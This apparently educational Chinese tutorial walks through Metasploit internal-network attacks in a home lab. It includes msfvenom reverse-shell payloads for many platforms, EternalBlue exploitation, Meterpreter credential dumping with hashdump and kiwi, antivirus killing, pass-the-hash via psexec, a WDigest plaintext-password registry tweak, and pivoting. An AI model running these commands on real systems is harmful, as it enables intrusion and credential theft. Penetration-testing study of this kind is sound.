# 原创
：  内网MSF--从入门到熟练

# 内网MSF--从入门到熟练

Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称叫做MSF。Metasploit<br/> 作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开<br/> 发自己的漏洞脚本，从而进行测试。

### 一：基础命令

#### 1.启动

shell中运行`msfconlose`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7550c58adb5834b9584a870a20eb4e64.jpeg"/>

#### 2.建立数据库

MSF数据库是为了得到的结果存入数据库，首次运行msf会发现没有连接数据库，需要自己手工建立。<br/> `db_status`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/447d139a9b9d1730f859f1f44764c4b7.jpeg"/><br/> 可以看到是PostgreSQL数据库，启动一下

```
service postgresql start    #启动数据库
msfdb init        #初始化数据库
msfconsole db_status       #查看连接情况
msfconsole db_rebuild_cache       #建立数据库缓存

```

启动数据库后可能还是会出现连不上的问题<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e4338a57fbd7c4432c9687149a9dd378.jpeg"/><br/> exit先退出来，在外边shell启动数据库

```
msfdb start               #启动
netstat -pantu | grep 5432         #查看端口

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b3c7b1561af980c905a45f972d657a28.jpeg"/><br/> 再进入msf，此时数据库应该已经连接。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/1b8e6cb653bc002b59ef239db7ac9c9e.jpeg"/>

#### 常用命令

```
show exploits – 查看所有可用的渗透攻击程序代码
show auxiliary – 查看所有可用的辅助攻击工具
show options – 查看该模块所有可用选项
show payloads – 查看该模块适用的所有载荷代码
show targets – 查看该模块适用的攻击目标类型
search – 根据关键字搜索某模块
info – 显示某模块的详细信息
use – 进入使用某渗透攻击模块
back – 回退 set/unset – 设置/禁用模块中的某个参数
setg/unsetg – 设置/禁用适用于所有模块的全局参数
save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用
Cd 更改当前的工作目录
核心命令
Sessions 转储会话列表并显示有关会话的信息
Color 切换颜色
Set 将特定于上下文的变量设置为一个值
Connect 连接与主机通信
Setg 将全局变量设置为一个值
exit 退出控制台
sleep 在指定的秒数内不做任何事情
get 获取特定于上下文的变量的值
spool 将控制台输出写入文件以及屏幕
getg 获取全局变量的值
threads 线程查看和操作后台线程
grep grep 另一个命令的输出
unload 卸载框架插件
history 显示命令历史
unset 取消设置一个或多个特定于上下文的变量
irb 进入irb脚本模式
unsetg 取消设置一个或多个全局变量
load 加载一个框架插件
version 显示框架和控制台库版本号
quit 退出控制台
route 通过会话路由流量
save 保存活动的数据存储
数据库后端命令
analyze 分析有关特定地址或地址范围的数据库信息
db_connect 连接到现有数据服务
db_disconnect 断开与当前数据服务的连接
db_export 导出包含数据库内容的文件
db_import 导入扫描结果文件（将自动检测文件类型）
db_nmap 执行nmap并自动记录输出
db_rebuild_cache 重建数据库存储的模块高速缓存
db_remove 删除已保存的数据服务条目
db_save 将当前数据服务连接保存为启动时重新连接的默认值
db_status 显示当前数据服务状态
hosts 列出数据库中的所有主机
loot 列出数据库中的所有战利品
notes 列出数据库中的所有注释
services 列出数据库中的所有服务
vulns 列出数据库中的所有漏洞
workspace 在数据库工作区之间切换
凭据后端命令
creds 列出数据库中的所有凭据
模块命令
Advanced 显示一个或多个模块的高级选项
Back 从当前上下文返回
Edit 使用首选编辑器编辑当前模块
info 显示有关一个或多个模块的信息
loadpath 路径从路径搜索并加载模块
options 显示全局选项或一个或多个模块
popm 将最新的模块从堆栈中弹出并使其处于活动状态
previous 将之前加载的模块设置为当前模块
pushm 将活动或模块列表推入模块堆栈
reload_all 从所有定义的模块路径重新加载所有模块
search 搜索模块名称和描述
show 显示给定类型的模块或所有模块
use 按名称选择模块
enumdesktops #查看可用的桌面
getdesktop #获取当前meterpreter 关联的桌面
setdesktop #设置meterpreter关联的桌面 -h查看帮助
screenshot #截屏
run vnc #使用vnc远程桌面连接

```

### 二：msfvenom

在MSF中，一般我们生成payload程序后门之类的都是用`msfvenom`，msfvenom是攻击载荷生成和编码器。

#### 1.主要参数

```
-p payload
-e 编码方式,指定编码器，可以实现免杀
-i 编码次数。指定编码迭代次数，一般配合免杀使用
-b: 去掉坏字符，坏字符会影响payload 正常执行
LHOST,LPORT 监听上线的主机IP和端口
-f 指定生成格式，如exe 生成EXE格式
-o 指定文件名称和导出位置
-l 可以查看可以利用payload
msfvenom -l
| grep windows | grep x64 | grep tcp 选择payload

```

#### 2.生成可执行文件

使用msfvenom生成可执行的后门文件，各种文件生成命令如下：<br/> linux<br/> `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=Port shell.elf`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/2f6551b7616919a7296aed048846a780.jpeg"/><br/> Windows<br/> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT= Port -f exe &gt; shell.exe`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/241c46ad59e66ba5456f0404e21ca2b6.jpeg"/><br/> Mac:<br/> `msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho`<br/> PHP:<br/> `msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php`<br/> `cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php`<br/> ASP:<br/> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp`<br/> JSP:<br/> `msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp`<br/> WAR:<br/> `msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war`<br/> Python:<br/> `msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py`<br/> Bash:<br/> `msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh`<br/> Perl:<br/> `msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl`

#### 3.设置监听

```
use exploit/multi/handler #使用监听模块
set payload windows/x64/meterpreter/reverse_tcp
show options
set LHOST 172.16.0.4
set ExitOnSession false  #让connection保持连接
exploit     #攻击，可以添加参数，-j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)

```

其他命令

```
jobs 查看后台攻击任务
kill &lt;id&gt; 停止某后台攻击任务
sessions -l (查看会话)
backgroup 放置后台
sessions 1 选择会话
sessions -k 1 结束会话
Ctrl+z 把会话放到后台
Ctrl+c 结束会话

```

#### 4.实验

目标靶机：<br/> Windows server 2008: 192.168.200.130<br/> 攻击机：<br/> kali linux : 192.168.200.128

msf生成攻击payload<br/> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.200.128 LPORT=4444 -f exe &gt; shell.exe`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/87f723eb62099cad77c74c38e6314653.jpeg"/><br/> msf启动监听<br/> `use exploit/multi/handler`<br/> `set payload windows/x64/meterpreter/reverse_tcp`<br/> 设置options<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/36885c8561a000d60457147996dc79a1.jpeg"/><br/> `exploit`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/f7a8a0ff30b0a511a1787c8490dc0f4b.jpeg"/><br/> kali开启http服务模拟投毒web站点<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/9b4518ba8fb45b9b1c1bbc05a3cc5768.jpeg"/><br/> 此时Windows用户下载并运行shell.exe，获取到对方权限<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ab20e357bb385c1f47997b2ec1dca6dc.jpeg"/><br/> 可以看到这里的meterpreter并不是一个可以执行命令的shell

### 三：Meterpreter后渗透

Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。

#### 1.常用命令

帮助菜单

```
background – 将当前会话移动到背景
  bgkill – 杀死一个背景 meterpreter 脚本
  bglist – 提供所有正在运行的后台脚本的列表
  bgrun – 作为一个后台线程运行脚本
  channel – 显示活动频道
  close – 关闭通道
  exit – 终止 meterpreter 会话
  help – 帮助菜单
  interact – 与通道进行交互
  irb – 进入 Ruby 脚本模式
  migrate – 移动到一个指定的 PID 的活动进程
  quit – 终止 meterpreter 会话
  read – 从通道读取数据
  run – 执行以后它选定的 meterpreter 脚本
  use – 加载 meterpreter 的扩展
  write – 将数据写入到一个通道

```

文件系统命令

```
cat -读取并输出到标准输出文件的内容
  cd -更改目录对受害人
  del -删除文件对受害人
  download-从受害者系统文件下载
  edit-用 vim编辑文件
  getlwd -打印本地目录
  getwd -打印工作目录
  lcd -更改本地目录
  lpwd -打印本地目录
  ls -列出在当前目录中的文件列表
  mkdir -在受害者系统上的创建目录
  pwd -输出工作目录
  rm -删除文件
  rmdir -受害者系统上删除目录
  upload-从攻击者的系统往受害者系统上传文件

```

网络命令

```
ipconfig -显示网络接口的关键信息，包括 IP 地址、 等。
  portfwd -端口转发
  route -查看或修改受害者路由表

```

系统命令

```
clearav -清除了受害者的计算机上的事件日志
  drop_token -被盗的令牌
  execute-执行命令
  getpid -获取当前进程 ID (PID)
  getprivs -尽可能获取尽可能多的特权
  getuid -获取作为运行服务器的用户
  kill -终止指定 PID 的进程
  ps -列出正在运行的进程
  reboot-重新启动受害人的计算机
  reg -与受害人的注册表进行交互
  rev2self -在受害者机器上调用 RevertToSelf()
  shell -在受害者计算机上打开一个shell
  shutdown-关闭了受害者的计算机
  steal_token -试图窃取指定的 (PID) 进程的令牌
  sysinfo -获取有关受害者计算机操作系统和名称等的详细信息

```

用户界面命令

```
enumdesktops -列出所有可访问台式机
  getdesktop -获取当前的 meterpreter 桌面
  idletime -检查长时间以来，受害者系统空闲进程
  keyscan_dump -键盘记录软件的内容转储
  keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件
  keyscan_stop -停止键盘记录软件
  screenshot-抓去 meterpreter 桌面的屏幕截图
  set_desktop -更改 meterpreter 桌面
  uictl -启用用户界面组件的一些控件

```

特权升级命令

```
getsystem -获得系统管理员权限

```

密码转储命令

```
hashdump -抓去哈希密码 (SAM) 文件中的值

```

下面是我常用的一些命令

```
meterpreter &gt; background 放回后台
meterpreter &gt; exit 关闭会话
meterpreter &gt; help 帮助信息
meterpreter &gt; Sysinfo 系统平台信息
meterpreter &gt; screenshot 屏幕截取
meterpreter &gt; shell 命令行shell (exit退出)
meterpreter &gt; getlwd 查看本地目录
meterpreter &gt; lcd 切换本地目录
meterpreter &gt; getwd 查看目录
meterpreter &gt; ls 查看文件目录列表
meterpreter &gt; cd 切换目录
meterpreter &gt; rm 删除文件
meterpreter &gt; download C:\\Users\\123\\Desktop\\1.txt 1.txt 下载文件
meterpreter &gt; upload /var/www/wce.exe wce.exe 上传文件
meterpreter &gt; search -d c: -f *.doc 搜索文件
meterpreter &gt; execute -f cmd.exe -i 执行程序/命令
meterpreter &gt; ps 查看进程
meterpreter &gt; run post/windows/capture/keylog_recorder 键盘记录
meterpreter &gt; getuid 查看当前用户权限
meterpreter &gt; use priv 加载特权模块
meterpreter &gt; getsystem 提升到SYSTEM权限
meterpreter &gt; hashdump 导出密码散列
meterpreter &gt; ps 查看高权限用户PID
meterpreter &gt; steal_token &lt;PID&gt; 窃取令牌
meterpreter &gt; rev2self 恢复原来的令牌
meterpreter &gt; migrate pid 迁移进程
meterpreter &gt; run killav 关闭杀毒软件
meterpreter &gt; run getgui-e 启用远程桌面
meterpreter &gt; portfwd add -l 1234 -p 3389 -r &lt;目标IP&gt; 端口转发
meterpreter &gt; run get_local_subnets 获取内网网段信息
meterpreter &gt; run autoroute -s &lt;内网网段&gt; 创建自动路由
meterpreter &gt; run autoroute -p 查看自动路由表
创建代理通道:
msf &gt; use auxiliary/server/socks4a 设置socks4代理模块
msf auxiliary(socks4a) &gt; show options
msf auxiliary(socks4a) &gt; run
配置proxychains参数：
nano /etc/proxychains.conf 修改代理监听端口,和前面端口一致
quite_mode 设置成安静模式：去掉如下参数前面的注释

```

### 四：MSF实现自动化攻击

metasploit-autopwn是一个很强大的模块，能够让MSF实现对目标的全自动化渗透测试。<br/> 项目地址：<br/> [https://github.com/hahwul/metasploit-autopwn](https://github.com/hahwul/metasploit-autopwn)<br/> 1.安装metasploit-autopwn模块

```
cd /usr/share/metasploit-framework/plugins
git clone https://github.com/hahwul/metasploit-db_autopwn.git
cd metasploit-db_autopwn/
mv db_autopwn.rb /usr/share/metasploit-framework/plugins/

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/978325a271c870fcd25cbb443203eab8.jpeg"/><br/> 启动msf加载模块<br/> `load db_autopwn`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c770ed0ef4d6fbd897a7be64c87fbd52.jpeg"/><br/> 如下可实现对任何连接到系统8000端口的目标进行自动化渗透攻击。

```
msf6 &gt; load db_autopwn
[*] Successfully loaded plugin: db_autopwn
msf6 &gt; use auxiliary/server/browser_autopwn
msf6 auxiliary(server/browser_autopwn) &gt; options

Module options (auxiliary/server/browser_autopwn):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   LHOST                     yes       The IP address to use for reverse-connect payloads
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. Thi
                                       s must be an address on the local machine or 0.0.0.0
                                       to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly
                                        generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Auxiliary action:

   Name       Description
   ----       -----------
   WebServer  Start a bunch of modules and direct clients to appropriate exploits



View the full module info with the info, or info -d command.

msf6 auxiliary(server/browser_autopwn) &gt; set rhosts 192.168.200.130
[!] Unknown datastore option: rhosts. Did you mean URIHOST?
rhosts =&gt; 192.168.200.130
msf6 auxiliary(server/browser_autopwn) &gt; set srvport 8000
srvport =&gt; 8000
msf6 auxiliary(server/browser_autopwn) &gt; set lhost 192.168.200/128
[-] The following options failed to validate: Value '192.168.200/128' is not valid for option 'LHOST'.
lhost =&gt; 
msf6 auxiliary(server/browser_autopwn) &gt; set LHOST 192.168.200.128
LHOST =&gt; 192.168.200.128
msf6 auxiliary(server/browser_autopwn) &gt; set uripath /
uripath =&gt; /
msf6 auxiliary(server/browser_autopwn) &gt; exploit
[*] Running module against 192.168.200.130
[*] Auxiliary module running as background job 0.

[*] Setup
msf6 auxiliary(server/browser_autopwn) &gt; 
[*] Starting exploit modules on host 192.168.200.128...
[*] ---

[*] Starting exploit android/browser/webview_addjavascriptinterface with payload android/meterpreter/reverse_tcp

......

[*] Starting handler for java/meterpreter/reverse_tcp on port 7777
[*] Started reverse TCP handler on 192.168.200.128:6666 
[*] Started reverse TCP handler on 192.168.200.128:7777 

[*] --- Done, found 0 exploit modules

[-] No exploits, check your MATCH and EXCLUDE settings
[*] Cleaning up exploits...

```

### 五：内网实验

目标主机：<br/> Windows server 2008 (192.168.200.130)存在ms17010永恒之蓝漏洞

#### MS17010攻击

```
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set RHOSTS 192.168.200.130
exploit

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/1a2689a10433c6ffeb1969bd299fa3f0.jpeg"/><br/> 获取meterpreter

#### 抓取目标主机密码

使用`hashdump`抓取密码<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/aa7f6c0891f51259b0ec336b89bc01dc.jpeg"/><br/> 得到目标主机hash值<br/> 注：mimikatz在新版本msf中已经取消，mimikatz模块已经合并为kiwi模块<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a6237b4dbeeaa524a0c08693bba9e7ba.jpeg"/><br/> 常用命令

```
load kiwi

creds_all：列举所有凭据
creds_kerberos：列举所有kerberos凭据
creds_msv：列举所有msv凭据
creds_ssp：列举所有ssp凭据
creds_tspkg：列举所有tspkg凭据
creds_wdigest：列举所有wdigest凭据
dcsync：通过DCSync检索用户帐户信息
dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
golden_ticket_create：创建黄金票据
kerberos_ticket_list：列举kerberos票据
kerberos_ticket_purge：清除kerberos票据
kerberos_ticket_use：使用kerberos票据
kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
lsa_dump_sam：dump出lsa的SAM
lsa_dump_secrets：dump出lsa的密文
password_change：修改密码
wifi_list：列出当前用户的wifi配置文件
wifi_list_shared：列出共享wifi配置文件/编码

```

creds_all命令直接获取密码<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/dc8c994f83e557fcfa3b2c165db1db8b.jpeg"/><br/> 由于mimikatz只是集成在了kiwi模块中，如果想使用mimikatz命令也是可以kiwi_cmd直接实现的，kiwi_cmd 模块可以让我们使用mimikatz的全部功能。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7744910bb91a5a650653323d71676c31.jpeg"/><br/> 在Windows2012系统及以上的系统，默认在内存缓存中禁止保存明文密码的。攻击者可以通过修改注册<br/> 表的方式抓取明文，需要用户重新登录后才能成功抓取

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v
UseLogonCredential /t REG_DWORD /d 1 /f

```

#### psexec

MSF中也是有psexec模块的，抓取到hash密码后

```
use exploit/windows/smb/psexec
set SMBUser Administrator
set smbpass aad3b435b51404eeaad3b435b51404ee:ae74afe74b7c6c328c901bf54a704396
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.200.128
set lport 6666
set rhosts 192.168.200.130
exploit

```

#### 开启远程桌面

##### shell开启

REG查看RDP端口

```
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/8cfd7cb90cf93dba7a39f31bef565990.jpeg"/><br/> 开启RDP

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f

```

##### enable_rdp模块

enable_rdp模块可以实现开启RDP

```
run post/windows/manage/enable_rdp

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/0f2315079686602751706c8e501cf6b6.jpeg"/><br/> 验证开启<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/963511b61874808e14a0ee3e6db5e836.jpeg"/><br/> 关闭

```
run multi_console_command -r /root/.msf4/loot/20231225131125_default_192.168.200.130_host.windows.cle_755971.txt

```

##### getgui模块

```
run getgui -e 开启远程终端
run post/windows/manage/enable_rdp
run getgui -u m -p QWEasd123 添加本地管理员

```

#### 端口转发

如果服务器防火墙开启的情况下，有可能拦截远程终端端口，使用命令把远程端口3389转发出来<br/> 转发3389端口

```
portfwd add -l 1234 -p 3389 -r 192.168.200.130
rdesktop 127.0.0.1:1234

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/729178676028e2f0acfb63dfc66fba03.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b8cc9b6991f09aeff4bf2a968596a9aa.jpeg"/>

#### 跨路由访问

在渗透测试过程中，经常拿到web主机与数据库不同在一个网段，可以得出这台主机还连着一个内网，<br/> 如果想要继续渗透内网，可以把这台web主机当作跳板机，对内网进行渗透

##### 实验环境

```
域控：
windows2012
192.168.3.33
administrator/Admin12345
 
域内成员主机：

windows2008
192.168.3.22
192.168.200.134
administrator/admin!@#45
xd\dbadmin/admin!@#45
 
域内成员主机：
windows7
192.168.3.11
administrator/admin!@#45
xd\dbadmin/admin!@#45

攻击机:
kalilinux
192.168.200.128

```

kali不通192.168.3.0段<br/> 通过永恒之蓝拿到Windows2008的meterpreter<br/> 获取内网网卡命令<br/> `run get_local_subnets`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a25abd9b65764208af7ec7e74033eb62.jpeg"/><br/> 绑定路由 不绑定路由就没法访问目标主机

```
run autoroute -s 192.168.3.0/24
route add 192.168.3.0 255.255.255.0 1
run autoroute -p

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/88f2a331edca26ac50b42579075877fe.jpeg"/><br/> 使用socks5隧道,这个代理就是开启了一个socks代理，监听vps本地端口，然后再通过这个端口将流量转给msf，msf转发给路由，所以能将流量直接带入到内网中<br/> `use auxiliary/server/socks_proxy`<br/> show options设置代理ip为127.0.0.1<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/2b48680bc857f0eaf532a0ca4ec7fe37.jpeg"/><br/> 编辑隧道配置文件<br/> `sudo vi /etc/proxychains4.conf`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/89997a474aff1df621193601652c0256.jpeg"/><br/> msf 使用代理访问目标

```
setg Proxies socks5:192.168.200.199:1080
set ReverseAllowProxy true

```

`proxychains nmap -p 1-10000 -Pn -sT 192.168.3.11`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7a3ac8cd3e816f23be7fb5a99823f5ec.jpeg"/><br/> 成功代理打通网段

#### 域信息收集

MSF常用信息收集模块

```
auxiliary/scanner/discovery/arp_sweep #基于arp协议发现内网存活主机，这不能通过代理使用
auxiliary/scanner/portscan/ack #基于tcp的ack回复进行端口扫描，默认扫描1-10000端口
auxiliary/scanner/portscan/tcp #基于tcp进行端口扫描，默认扫描1-10000端口
auxiliary/scanner/discovery/udp_sweep #基于udp协议发现内网存活主机
auxiliary/scanner/discovery/udp_probe #基于udp协议发现内网存活主机
auxiliary/scanner/netbios/nbname #基于netbios协议发现内网存活主机
auxiliary/scanner/ftp/ftp_version #发现内网ftp服务，基于默认21端口
auxiliary/scanner/ssh/ssh_version #发现内网ssh服务，基于默认22端口
auxiliary/scanner/telnet/telnet_version #发现内网telnet服务，基于默认23端口
auxiliary/scanner/dns/dns_amp #发现dns服务，基于默认53端口
auxiliary/scanner/http/http_version #发现内网http服务，基于默认80端口
auxiliary/scanner/http/title #探测内网http服务的标题
auxiliary/scanner/smb/smb_version #发现内网smb服务，基于默认的445端口
use auxiliary/scanner/mssql/mssql_schemadump #发现内网SQLServer服务,基于默认的1433端口
use auxiliary/scanner/oracle/oracle_hashdump #发现内网oracle服务,基于默认的1521端口
auxiliary/scanner/mysql/mysql_version #发现内网mysql服务，基于默认3306端口
auxiliary/scanner/rdp/rdp_scanner #发现内网RDP服务，基于默认3389端口
auxiliary/scanner/redis/redis_server #发现内网Redis服务，基于默认6379端口
auxiliary/scanner/db2/db2_version #探测内网的db2服务，基于默认的50000端口
auxiliary/scanner/netbios/nbname

```

收集域信息

```
run post/windows/gather/enum_logged_on_users #查看登录过的用户信息
run post/windows/gather/enum_ad_groups #查看组信息
run post/windows/gather/enum_domain #定位域控
run post/windows/gather/enum_ad_computers #域内所有机器
use post/windows/gather/enum_patches #发现缺失的补丁
use post/multi/recon/local_exploit_suggester #快速识别可能被利用的漏洞
run post/windows/manage/migrate #自动进程迁移
run post/windows/gather/checkvm #查看目标主机是否运行在虚拟机上
run post/windows/manage/killav #关闭杀毒软件
run post/windows/manage/enable_rdp #开启远程桌面服务
run post/windows/manage/autoroute #查看路由信息
run post/windows/gather/enum_logged_on_users #列举当前登录的用户
run post/windows/gather/enum_applications #列举应用程序
run post/windows/gather/credentials/windows_autologin #抓取自动登录
的用户名和密码
run post/windows/gather/smart_hashdump #dump出所有用户的hash
run post/windows/gather/enum_domain_tokens #寻找域token

```

定位域控、抓取密码、查看域内主机<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/fc8b665f1da45f58a48d6fbff77465e1.jpeg"/>

#### 密码喷洒

```
auxiliary/gather/kerberos_enumusers #Kerberos 用户名枚举–用户名字典
set DOMAIN XIAODI.LOCAL
set rhosts 192.168.200.134
set user_file 字典路径
exploirt

```
